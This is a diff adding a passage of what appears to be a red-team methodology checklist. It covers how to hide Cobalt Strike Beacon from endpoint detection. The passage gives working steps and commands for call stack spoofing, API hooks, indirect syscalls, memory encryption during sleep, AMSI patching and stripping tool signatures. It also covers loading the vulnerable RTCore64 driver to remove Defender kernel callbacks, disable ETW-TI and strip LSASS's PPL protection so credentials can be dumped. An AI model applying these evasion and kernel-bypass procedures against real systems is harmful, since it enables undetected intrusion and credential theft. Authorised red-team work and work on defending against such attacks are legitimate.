+        <li><input type="checkbox" data-id="methodology-load-time-sig-removal-wf-2-0"> Run YARA with community Cobalt Strike rulesets</li>
+        <li><input type="checkbox" data-id="methodology-load-time-sig-removal-wf-2-1"> Submit to an isolated AV sandbox (not VirusTotal &mdash; preserves operational secrecy)</li>
+        <li><input type="checkbox" data-id="methodology-load-time-sig-removal-wf-2-2"> Re-scan after every profile or kit change</li>
+      </ul>
+    </li>
+  </ul>
+<p><strong>References:</strong> <a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/" target="_blank" rel="noopener noreferrer">Cobalt Strike user guide</a> &middot; <a href="https://outflank.nl/blog/" target="_blank" rel="noopener noreferrer">Outflank blog</a></p>
+
+<h4 id="methodology-load-time-rwx-removal">11.3.4 RWX Removal</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-load-time-rwx-removal-wf-0"> Allocate memory as RW, not RWX:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-load-time-rwx-removal-wf-0-0"> RWX allocations are a high-confidence indicator for memory scanners</li>
+        <li><input type="checkbox" data-id="methodology-load-time-rwx-removal-wf-0-1"> Initial allocation with <code>PAGE_READWRITE</code> only</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-load-time-rwx-removal-wf-1"> Apply per-section permissions after loading:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-load-time-rwx-removal-wf-1-0"> Walk the PE section headers of the loaded Beacon</li>
+        <li><input type="checkbox" data-id="methodology-load-time-rwx-removal-wf-1-1"> Map <code>IMAGE_SCN_MEM_EXECUTE</code> &rarr; <code>PAGE_EXECUTE_READ</code></li>
+        <li><input type="checkbox" data-id="methodology-load-time-rwx-removal-wf-1-2"> Map <code>IMAGE_SCN_MEM_WRITE</code> &rarr; <code>PAGE_READWRITE</code></li>
+        <li><input type="checkbox" data-id="methodology-load-time-rwx-removal-wf-1-3"> Map read-only sections &rarr; <code>PAGE_READONLY</code></li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-load-time-rwx-removal-wf-2"> Verify no RWX pages remain:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-load-time-rwx-removal-wf-2-0"> Use <code>VirtualQuery</code> to walk the Beacon&rsquo;s memory regions</li>
+        <li><input type="checkbox" data-id="methodology-load-time-rwx-removal-wf-2-1"> Confirm zero pages with PAGE_EXECUTE_READWRITE</li>
+      </ul>
+    </li>
+  </ul>
+
+<h4 id="methodology-load-time-loader-callstack">11.3.5 Loader Call Stack Spoofing</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-load-time-loader-callstack-wf-0"> Implement the Draugr technique:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-load-time-loader-callstack-wf-0-0"> Build synthetic stack frames with <code>RtlUserThreadStart</code> and <code>BaseThreadInitThunk</code> return addresses</li>
+        <li><input type="checkbox" data-id="methodology-load-time-loader-callstack-wf-0-1"> Use <code>spoof_call(FUNCTION_CALL*)</code> to wrap every sensitive API call</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-load-time-loader-callstack-wf-1"> Hook VirtualAlloc in the loader spec:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-load-time-loader-callstack-wf-1-0"> <code>attach "KERNEL32$VirtualAlloc" "_VirtualAlloc"</code></li>
+        <li><input type="checkbox" data-id="methodology-load-time-loader-callstack-wf-1-1"> The hook intercepts the call, pushes spoofed frames, then forwards</li>
+        <li><input type="checkbox" data-id="methodology-load-time-loader-callstack-wf-1-2"> Apply the same pattern to VirtualProtect, CreateThread, and other monitored APIs</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-load-time-loader-callstack-wf-2"> Validate call stacks under a debugger:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-load-time-loader-callstack-wf-2-0"> Attach WinDbg to the loader process</li>
+        <li><input type="checkbox" data-id="methodology-load-time-loader-callstack-wf-2-1"> Break on NtAllocateVirtualMemory and inspect the stack</li>
+        <li><input type="checkbox" data-id="methodology-load-time-loader-callstack-wf-2-2"> Confirm the stack shows legitimate ntdll/kernel32 frames, not your loader module</li>
+      </ul>
+    </li>
+  </ul>
+
+<p><strong>General references:</strong> <a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/" target="_blank" rel="noopener noreferrer">Cobalt Strike user guide</a> &middot; <a href="https://outflank.nl/blog/" target="_blank" rel="noopener noreferrer">Outflank blog</a> &middot; <a href="https://maldevacademy.com/" target="_blank" rel="noopener noreferrer">Maldev Academy resources</a></p>
+
+<h3 id="methodology-runtime">11.4 Runtime Evasion</h3>
+<p>Once the loader has placed Beacon in memory, runtime evasion keeps it hidden during execution. Hook APIs, obfuscate memory during sleep, and clean up artifacts.</p>
+<h4 id="methodology-runtime-pico-hooks">11.4.1 PICO Hooks</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-runtime-pico-hooks-wf-0"> Understand the PICO architecture:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-runtime-pico-hooks-wf-0-0"> PICO (Position-Independent Code Object) loads alongside Beacon</li>
+        <li><input type="checkbox" data-id="methodology-runtime-pico-hooks-wf-0-1"> It hooks Beacon&rsquo;s <code>GetProcAddress</code> calls to redirect API resolution</li>
+        <li><input type="checkbox" data-id="methodology-runtime-pico-hooks-wf-0-2"> Every redirected call goes through call stack spoofing before reaching the real API</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-runtime-pico-hooks-wf-1"> Configure hooks in pico.spec:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-runtime-pico-hooks-wf-1-0"> <code>addhook</code> for each API Beacon calls that EDRs monitor:</li>
+        <li><input type="checkbox" data-id="methodology-runtime-pico-hooks-wf-1-1"> <code>InternetConnectA</code>, <code>InternetOpenA</code> &mdash; HTTP callbacks</li>
+        <li><input type="checkbox" data-id="methodology-runtime-pico-hooks-wf-1-2"> <code>VirtualAlloc</code>, <code>VirtualAllocEx</code>, <code>VirtualProtect</code> &mdash; memory operations</li>
+        <li><input type="checkbox" data-id="methodology-runtime-pico-hooks-wf-1-3"> <code>CreateProcessA</code>, <code>OpenProcess</code> &mdash; process operations</li>
+        <li><input type="checkbox" data-id="methodology-runtime-pico-hooks-wf-1-4"> <code>Sleep</code> &mdash; sleep masking entry point</li>
+        <li><input type="checkbox" data-id="methodology-runtime-pico-hooks-wf-1-5"> <code>LoadLibraryA</code>, <code>CoCreateInstance</code> &mdash; DLL/COM loading</li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-bash"># pico.spec — hook Beacon's API calls through PICO
+addhook "VirtualAlloc"        "_hook_VirtualAlloc"
+addhook "VirtualAllocEx"      "_hook_VirtualAllocEx"
+addhook "VirtualProtect"      "_hook_VirtualProtect"
+addhook "CreateProcessA"      "_hook_CreateProcessA"
+addhook "OpenProcess"         "_hook_OpenProcess"
+addhook "Sleep"               "_hook_Sleep"
+addhook "InternetConnectA"    "_hook_InternetConnectA"
+addhook "InternetOpenA"       "_hook_InternetOpenA"
+addhook "LoadLibraryA"        "_hook_LoadLibraryA"
+addhook "CoCreateInstance"    "_hook_CoCreateInstance"</code></pre>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-runtime-pico-hooks-wf-2"> Validate each hook fires correctly:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-runtime-pico-hooks-wf-2-0"> Set breakpoints on the hook functions in a debugger</li>
+        <li><input type="checkbox" data-id="methodology-runtime-pico-hooks-wf-2-1"> Confirm Beacon operates normally with all hooks active</li>
+        <li><input type="checkbox" data-id="methodology-runtime-pico-hooks-wf-2-2"> Test each Beacon command category: sleep, shell, execute-assembly, lateral movement</li>
+      </ul>
+    </li>
+  </ul>
+
+<h4 id="methodology-runtime-recycledgate">11.4.2 Indirect Syscalls via RecycledGate</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-runtime-recycledgate-wf-0"> Resolve SSNs at runtime:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-runtime-recycledgate-wf-0-0"> Walk ntdll EAT to find target Nt* function</li>
+        <li><input type="checkbox" data-id="methodology-runtime-recycledgate-wf-0-1"> Extract the SSN using Hell&rsquo;s/Halo&rsquo;s/Tartarus&rsquo; Gate</li>
+        <li><input type="checkbox" data-id="methodology-runtime-recycledgate-wf-0-2"> Cache resolved SSNs for the session lifetime</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-runtime-recycledgate-wf-1"> Find a clean syscall gadget in ntdll:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-runtime-recycledgate-wf-1-0"> Scan ntdll <code>.text</code> for the <code>syscall; ret</code> byte sequence</li>
+        <li><input type="checkbox" data-id="methodology-runtime-recycledgate-wf-1-1"> Use an unhooked function&rsquo;s syscall instruction as the jump target</li>
+        <li><input type="checkbox" data-id="methodology-runtime-recycledgate-wf-1-2"> The return address on the stack will point into ntdll &mdash; clean</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-runtime-recycledgate-wf-2"> Wire into PICO hooks:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-runtime-recycledgate-wf-2-0"> Each PICO hook resolves the SSN, sets up registers, and jumps to the gadget</li>
+        <li><input type="checkbox" data-id="methodology-runtime-recycledgate-wf-2-1"> Combine with call stack spoofing for defense-in-depth</li>
+      </ul>
+    </li>
+  </ul>
+<p><strong>References:</strong> <a href="https://maldevacademy.com/" target="_blank" rel="noopener noreferrer">Maldev Academy resources</a> &middot; <a href="https://outflank.nl/blog/" target="_blank" rel="noopener noreferrer">Outflank blog</a></p>
+
+<h4 id="methodology-runtime-memory-obfuscation">11.4.3 Memory Obfuscation</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-runtime-memory-obfuscation-wf-0"> Encrypt Beacon memory during sleep:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-runtime-memory-obfuscation-wf-0-0"> Hook the Sleep API via PICO</li>
+        <li><input type="checkbox" data-id="methodology-runtime-memory-obfuscation-wf-0-1"> Before sleeping: XOR or RC4 encrypt all Beacon PE sections in memory</li>
+        <li><input type="checkbox" data-id="methodology-runtime-memory-obfuscation-wf-0-2"> After waking: decrypt, restore permissions, continue execution</li>
+        <li><input type="checkbox" data-id="methodology-runtime-memory-obfuscation-wf-0-3"> This is the equivalent of Cobalt Strike&rsquo;s Sleepmask</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-runtime-memory-obfuscation-wf-1"> Clean up loader artifacts:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-runtime-memory-obfuscation-wf-1-0"> Free the loader&rsquo;s memory region after Beacon is running</li>
+        <li><input type="checkbox" data-id="methodology-runtime-memory-obfuscation-wf-1-1"> Zero out any staging buffers that held decrypted shellcode</li>
+        <li><input type="checkbox" data-id="methodology-runtime-memory-obfuscation-wf-1-2"> Overwrite with <code>memset(addr, 0, size)</code> before freeing</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-runtime-memory-obfuscation-wf-2"> Handle memory scanners during execution:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-runtime-memory-obfuscation-wf-2-0"> Keep execution time between sleeps as short as possible</li>
+        <li><input type="checkbox" data-id="methodology-runtime-memory-obfuscation-wf-2-1"> Avoid long-running operations that keep Beacon decrypted</li>
+        <li><input type="checkbox" data-id="methodology-runtime-memory-obfuscation-wf-2-2"> Consider garbling PE headers even during execution</li>
+      </ul>
+    </li>
+  </ul>
+
+<p><strong>General references:</strong> <a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/" target="_blank" rel="noopener noreferrer">Cobalt Strike user guide</a> &middot; <a href="https://maldevacademy.com/" target="_blank" rel="noopener noreferrer">Maldev Academy resources</a> &middot; <a href="https://outflank.nl/blog/" target="_blank" rel="noopener noreferrer">Outflank blog</a></p>
+
+<h3 id="methodology-postex">11.5 Post-Exploitation Evasion</h3>
+<p>Post-exploitation commands generate their own telemetry. Control how each command executes, where it injects, and what signatures it leaves behind.</p>
+<h4 id="methodology-postex-bof-exec">11.5.1 BOF Execution</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-postex-bof-exec-wf-0"> Prefer BOFs over fork-and-run:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-postex-bof-exec-wf-0-0"> BOFs execute inline in the Beacon process &mdash; no child process, no injection</li>
+        <li><input type="checkbox" data-id="methodology-postex-bof-exec-wf-0-1"> Compile as COFF object files, loaded via Beacon&rsquo;s COFF loader</li>
+        <li><input type="checkbox" data-id="methodology-postex-bof-exec-wf-0-2"> Output returns via Beacon&rsquo;s named pipe, not stdout</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-postex-bof-exec-wf-1"> Configure the process-inject block for BOFs:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-postex-bof-exec-wf-1-0"> <code>bof_allocator</code> &mdash; controls memory allocation strategy</li>
+        <li><input type="checkbox" data-id="methodology-postex-bof-exec-wf-1-1"> <code>startrwx false</code> &mdash; never start with RWX permissions</li>
+        <li><input type="checkbox" data-id="methodology-postex-bof-exec-wf-1-2"> <code>userwx false</code> &mdash; never leave memory as RWX after execution</li>
+        <li><input type="checkbox" data-id="methodology-postex-bof-exec-wf-1-3"> <code>bof_reuse_memory true</code> &mdash; reuse allocated memory across BOF calls</li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-bash"># Malleable C2 — process-inject block for BOF and post-ex
+process-inject {
+    set bof_allocator      "VirtualAlloc";
+    set bof_reuse_memory   "true";
+    set startrwx           "false";
+    set userwx             "false";
+
+    execute {
+        CreateThread "ntdll.dll!RtlUserThreadStart+0x2c";
+        CreateRemoteThread "ntdll.dll!RtlUserThreadStart+0x2c";
+        NtQueueApcThread-s;
+        RtlCreateUserThread;
+    }
+}</code></pre>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-postex-bof-exec-wf-2"> Test BOF compatibility:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-postex-bof-exec-wf-2-0"> Not all tools have BOF equivalents</li>
+        <li><input type="checkbox" data-id="methodology-postex-bof-exec-wf-2-1"> Verify the BOF produces correct output against a test target</li>
+        <li><input type="checkbox" data-id="methodology-postex-bof-exec-wf-2-2"> Watch for BOFs that crash the Beacon process on failure</li>
+      </ul>
+    </li>
+  </ul>
+
+<h4 id="methodology-postex-fork-run">11.5.2 Fork &amp; Run Hardening</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-postex-fork-run-wf-0"> Hook the spawn and inject paths:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-postex-fork-run-wf-0-0"> <code>PROCESS_INJECT_SPAWN</code> &mdash; BOF hook for fork-and-run spawn operations</li>
+        <li><input type="checkbox" data-id="methodology-postex-fork-run-wf-0-1"> <code>PROCESS_INJECT_EXPLICIT</code> &mdash; BOF hook for explicit injection into existing processes</li>
+        <li><input type="checkbox" data-id="methodology-postex-fork-run-wf-0-2"> These hooks let you control how the sacrificial process is created and injected</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-postex-fork-run-wf-1"> Set a clean thread start address:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-postex-fork-run-wf-1-0"> <code>ObfSetThreadContext "ntdll.dll!RtlUserThreadStart+0x2c"</code></li>
+        <li><input type="checkbox" data-id="methodology-postex-fork-run-wf-1-1"> The injected thread&rsquo;s start address will point into ntdll, not your payload</li>
+        <li><input type="checkbox" data-id="methodology-postex-fork-run-wf-1-2"> EDRs check the thread start address against known-good module ranges</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-postex-fork-run-wf-2"> Patch AMSI in the post-ex loader:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-postex-fork-run-wf-2-0"> The post-ex DLL runs .NET assemblies (execute-assembly, powerpick)</li>
+        <li><input type="checkbox" data-id="methodology-postex-fork-run-wf-2-1"> AMSI will scan the loaded assembly unless patched in the spawned process</li>
+        <li><input type="checkbox" data-id="methodology-postex-fork-run-wf-2-2"> Patch before any .NET content is loaded</li>
+      </ul>
+    </li>
+  </ul>
+
+<h4 id="methodology-postex-tool-sig-strip">11.5.3 Tool Signature Stripping</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-postex-tool-sig-strip-wf-0"> Strip post-ex DLL signatures:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-postex-tool-sig-strip-wf-0-0"> Use the <code>POSTEX_RDLL_GENERATE</code> Aggressor hook</li>
+        <li><input type="checkbox" data-id="methodology-postex-tool-sig-strip-wf-0-1"> Apply <code>strrep_pad()</code> to remove known strings from each post-ex reflective DLL</li>
+        <li><input type="checkbox" data-id="methodology-postex-tool-sig-strip-wf-0-2"> Target: mimikatz strings, Rubeus GUIDs, Seatbelt markers</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-postex-tool-sig-strip-wf-1"> Strip tool signatures before loading:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-postex-tool-sig-strip-wf-1-0"> Replace static GUIDs in .NET assemblies with random values</li>
+        <li><input type="checkbox" data-id="methodology-postex-tool-sig-strip-wf-1-1"> Remove comment blocks and debug strings from PowerShell scripts</li>
+        <li><input type="checkbox" data-id="methodology-postex-tool-sig-strip-wf-1-2"> Recompile C# tools with renamed namespaces and obfuscated strings</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-postex-tool-sig-strip-wf-2"> Validate with memory scanners:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-postex-tool-sig-strip-wf-2-0"> Run the post-ex command in a test environment with the target EDR</li>
+        <li><input type="checkbox" data-id="methodology-postex-tool-sig-strip-wf-2-1"> Check for detection during execution, not just at load time</li>
+        <li><input type="checkbox" data-id="methodology-postex-tool-sig-strip-wf-2-2"> Iterate until the command completes without alerts</li>
+      </ul>
+    </li>
+  </ul>
+<p><strong>References:</strong> <a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/" target="_blank" rel="noopener noreferrer">Cobalt Strike user guide</a> &middot; <a href="https://outflank.nl/blog/" target="_blank" rel="noopener noreferrer">Outflank blog</a></p>
+
+<p><strong>General references:</strong> <a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/" target="_blank" rel="noopener noreferrer">Cobalt Strike user guide</a> &middot; <a href="https://outflank.nl/blog/" target="_blank" rel="noopener noreferrer">Outflank blog</a></p>
+
+<h3 id="methodology-kernel-bypass">11.6 Kernel-Mode Bypasses</h3>
+<p>When user-mode evasion is insufficient, use a vulnerable kernel driver to disable EDR components at the kernel level. This is the most invasive evasion layer.</p>
+<h4 id="methodology-kernel-bypass-driver-load">11.6.1 Vulnerable Driver Loading</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-kernel-bypass-driver-load-wf-0"> Select a known-vulnerable driver:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-kernel-bypass-driver-load-wf-0-0"> RTCore64.sys (Micro-Star) &mdash; arbitrary kernel read/write</li>
+        <li><input type="checkbox" data-id="methodology-kernel-bypass-driver-load-wf-0-1"> dbutil_2_3.sys (Dell) &mdash; arbitrary kernel read/write</li>
+        <li><input type="checkbox" data-id="methodology-kernel-bypass-driver-load-wf-0-2"> Confirm the driver is not blocklisted by the target&rsquo;s driver block policy</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-kernel-bypass-driver-load-wf-1"> Install and start the driver:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-kernel-bypass-driver-load-wf-1-0"> <code>sc create RTCore64 type= kernel binPath= C:\\Windows\\Temp\\RTCore64.sys start= demand</code></li>
+        <li><input type="checkbox" data-id="methodology-kernel-bypass-driver-load-wf-1-1"> <code>sc start RTCore64</code></li>
+        <li><input type="checkbox" data-id="methodology-kernel-bypass-driver-load-wf-1-2"> Verify the driver loaded: check for the device object or service status</li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-bash"># Install and start a vulnerable kernel driver
+sc create RTCore64 type= kernel binPath= C:\Windows\Temp\RTCore64.sys start= demand
+sc start RTCore64
+
+# Cleanup after operations
+sc stop RTCore64
+sc delete RTCore64
+del C:\Windows\Temp\RTCore64.sys</code></pre>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-kernel-bypass-driver-load-wf-2"> Plan for cleanup:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-kernel-bypass-driver-load-wf-2-0"> <code>sc stop RTCore64</code> and <code>sc delete RTCore64</code> after operations</li>
+        <li><input type="checkbox" data-id="methodology-kernel-bypass-driver-load-wf-2-1"> Delete the driver file from disk</li>
+        <li><input type="checkbox" data-id="methodology-kernel-bypass-driver-load-wf-2-2"> The driver load itself generates ETW and Sysmon events &mdash; operate quickly</li>
+      </ul>
+    </li>
+  </ul>
+
+<h4 id="methodology-kernel-bypass-callback-removal">11.6.2 Callback Removal</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-kernel-bypass-callback-removal-wf-0"> Enumerate all kernel callbacks:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-kernel-bypass-callback-removal-wf-0-0"> <code>list_callbacks</code> &mdash; shows process, thread, image load, handle, and registry callbacks</li>
+        <li><input type="checkbox" data-id="methodology-kernel-bypass-callback-removal-wf-0-1"> Identify which callbacks belong to the target EDR driver (e.g., WdFilter.sys for Defender)</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-kernel-bypass-callback-removal-wf-1"> Remove specific callbacks:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-kernel-bypass-callback-removal-wf-1-0"> <code>remove_callback 0 WdFilter.sys</code> &mdash; remove Defender&rsquo;s first process creation callback</li>
+        <li><input type="checkbox" data-id="methodology-kernel-bypass-callback-removal-wf-1-1"> Remove handle callbacks to allow opening protected processes (LSASS)</li>
+        <li><input type="checkbox" data-id="methodology-kernel-bypass-callback-removal-wf-1-2"> Remove image load callbacks to prevent DLL load monitoring</li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-bash"># Kernel callback operations
+list_callbacks                          # enumerate all kernel callbacks
+remove_callback 0 WdFilter.sys         # remove Defender's process creation callback
+remove_callback 1 WdFilter.sys         # remove Defender's thread creation callback</code></pre>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-kernel-bypass-callback-removal-wf-2"> Validate the removal:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-kernel-bypass-callback-removal-wf-2-0"> Attempt the previously-blocked operation (e.g., open LSASS handle)</li>
+        <li><input type="checkbox" data-id="methodology-kernel-bypass-callback-removal-wf-2-1"> Confirm no EDR alert fires</li>
+        <li><input type="checkbox" data-id="methodology-kernel-bypass-callback-removal-wf-2-2"> Re-run <code>list_callbacks</code> to confirm the entry is gone</li>
+      </ul>
+    </li>
+  </ul>
+
+<h4 id="methodology-kernel-bypass-etw-ti">11.6.3 ETW-TI Disabling</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-kernel-bypass-etw-ti-wf-0"> Understand ETW Threat Intelligence:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-kernel-bypass-etw-ti-wf-0-0"> Provider GUID: <code>{{F4E1897C-BB5D-5668-F1D8-040F4D8DD344}}</code></li>
+        <li><input type="checkbox" data-id="methodology-kernel-bypass-etw-ti-wf-0-1"> ETW-TI feeds telemetry to EDRs for process injection, credential access, and more</li>
+        <li><input type="checkbox" data-id="methodology-kernel-bypass-etw-ti-wf-0-2"> Bucket index formula: <code>(Data1 ^ Data2 ^ Data4[0] ^ Data4[4]) &amp; 0x3F</code></li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-kernel-bypass-etw-ti-wf-1"> Check ETW-TI status:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-kernel-bypass-etw-ti-wf-1-0"> <code>etw_enum {{F4E1897C-BB5D-5668-F1D8-040F4D8DD344}}</code></li>
+        <li><input type="checkbox" data-id="methodology-kernel-bypass-etw-ti-wf-1-1"> Shows whether the provider is enabled and which sessions consume it</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-kernel-bypass-etw-ti-wf-2"> Disable the provider:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-kernel-bypass-etw-ti-wf-2-0"> <code>etw_disable {{F4E1897C-BB5D-5668-F1D8-040F4D8DD344}}</code></li>
+        <li><input type="checkbox" data-id="methodology-kernel-bypass-etw-ti-wf-2-1"> Underlying mechanism: patch <code>ProviderEnableInfo.IsEnabled</code> to <code>0</code> in kernel memory</li>
+        <li><input type="checkbox" data-id="methodology-kernel-bypass-etw-ti-wf-2-2"> Validate: perform a monitored action and confirm no ETW-TI event fires</li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-bash"># ETW-TI operations
+etw_enum {F4E1897C-BB5D-5668-F1D8-040F4D8DD344}     # check ETW-TI provider status
+etw_disable {F4E1897C-BB5D-5668-F1D8-040F4D8DD344}   # disable the provider</code></pre>
+<p><strong>References:</strong> <a href="https://maldevacademy.com/" target="_blank" rel="noopener noreferrer">Maldev Academy resources</a> &middot; <a href="https://www.mdsec.co.uk/" target="_blank" rel="noopener noreferrer">MDSec research</a></p>
+
+<h4 id="methodology-kernel-bypass-ppl">11.6.4 PPL Manipulation</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-kernel-bypass-ppl-wf-0"> Check process protection level:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-kernel-bypass-ppl-wf-0-0"> <code>ppenum [pid]</code> &mdash; shows the current protection level</li>
+        <li><input type="checkbox" data-id="methodology-kernel-bypass-ppl-wf-0-1"> Protected processes (PPL) cannot be opened with PROCESS_ALL_ACCESS</li>
+        <li><input type="checkbox" data-id="methodology-kernel-bypass-ppl-wf-0-2"> LSASS runs as PPL on modern Windows when Credential Guard or RunAsPPL is enabled</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-kernel-bypass-ppl-wf-1"> Remove PPL protection:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-kernel-bypass-ppl-wf-1-0"> <code>pppatch [pid] 0</code> &mdash; sets protection to <code>PsProtectedSignerNone</code></li>
+        <li><input type="checkbox" data-id="methodology-kernel-bypass-ppl-wf-1-1"> This requires kernel read/write via the vulnerable driver</li>
+        <li><input type="checkbox" data-id="methodology-kernel-bypass-ppl-wf-1-2"> After patching, the process can be opened normally</li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-bash"># PPL operations
+ppenum 672         # check protection level of process (PID 672 = lsass.exe)
+pppatch 672 0      # set protection to PsProtectedSignerNone</code></pre>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-kernel-bypass-ppl-wf-2"> Validate and operate:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-kernel-bypass-ppl-wf-2-0"> Open a handle to the now-unprotected process</li>
+        <li><input type="checkbox" data-id="methodology-kernel-bypass-ppl-wf-2-1"> Dump credentials or inject as needed</li>
+        <li><input type="checkbox" data-id="methodology-kernel-bypass-ppl-wf-2-2"> PPL removal is persistent until the process restarts</li>
+      </ul>
+    </li>
+  </ul>
+
+<h5>Kernel Callback Types &mdash; Quick Reference</h5>
+<table class="custom-table">
+  <thead>
+    <tr>
+      <th>Callback Type</th>
+      <th>Registration API</th>
+      <th>EDR Use</th>
+      <th>Bypass Method</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Process creation</td>
+      <td><code>PsSetCreateProcessNotifyRoutineEx</code></td>
+      <td>Alert on new processes, block suspicious spawns</td>
+      <td>Zero function pointer in callback array</td>
+    </tr>
+    <tr>
+      <td>Thread creation</td>
+      <td><code>PsSetCreateThreadNotifyRoutine</code></td>
+      <td>Detect remote thread injection</td>
+      <td>Zero function pointer in callback array</td>
+    </tr>
+    <tr>
+      <td>Image load</td>
+      <td><code>PsSetLoadImageNotifyRoutine</code></td>
+      <td>Monitor DLL and driver loads</td>
+      <td>Zero function pointer in callback array</td>
+    </tr>
+    <tr>
+      <td>Object handle</td>
+      <td><code>ObRegisterCallbacks</code></td>
+      <td>Block LSASS handle opens, prevent process kill</td>
+      <td>Set <code>Active = 0</code> in callback structure</td>
+    </tr>
+    <tr>
+      <td>Registry</td>
+      <td><code>CmRegisterCallbackEx</code></td>
+      <td>Monitor persistence via registry writes</td>
+      <td>Unlink from doubly-linked callback list</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><strong>General references:</strong> <a href="https://maldevacademy.com/" target="_blank" rel="noopener noreferrer">Maldev Academy resources</a> &middot; <a href="https://www.mdsec.co.uk/" target="_blank" rel="noopener noreferrer">MDSec research</a> &middot; <a href="https://rastamouse.me/" target="_blank" rel="noopener noreferrer">RastaMouse</a></p>
+
+<h3 id="methodology-wdac">11.7 WDAC Bypass</h3>
+<p>Windows Defender Application Control restricts which binaries can execute. Analyze the policy, identify gaps, and exploit them to run unsigned code.</p>
+<h4 id="methodology-wdac-policy-analysis">11.7.1 Policy Analysis</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-wdac-policy-analysis-wf-0"> Extract and decompile the WDAC policy:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-wdac-policy-analysis-wf-0-0"> <code>ConvertTo-WDACCodeIntegrityPolicy -BinaryFilePath policy.cip -XmlFilePath policy.xml</code></li>
+        <li><input type="checkbox" data-id="methodology-wdac-policy-analysis-wf-0-1"> The XML reveals all allow/deny rules, signers, and file attributes</li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-powershell"># Decompile WDAC binary policy to human-readable XML
+ConvertTo-WDACCodeIntegrityPolicy -BinaryFilePath .\SiPolicy.p7b -XmlFilePath .\policy.xml</code></pre>
+  <ul>
